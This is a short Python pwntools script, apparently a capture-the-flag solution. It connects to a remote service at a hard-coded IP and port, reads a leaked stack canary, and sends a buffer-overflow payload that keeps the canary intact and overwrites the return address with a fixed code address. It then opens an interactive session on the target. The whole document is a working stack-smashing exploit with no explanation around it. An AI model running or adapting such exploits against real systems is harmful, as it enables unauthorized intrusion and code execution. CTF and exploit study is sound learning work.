#!/usr/bin/env python3
from pwn import *
p = remote("61.28.237.106",30006)
p.recvuntil('later): ')
canary = int(p.recvline(keepends = False), 16)
p.sendline(b'a' * (64+8) + p64(canary) + b'a' * 8 + p64(0x401001 + 1))
log.info('This func logs info to your terminal, for example the canary: ' + hex(canary))
p.interactive()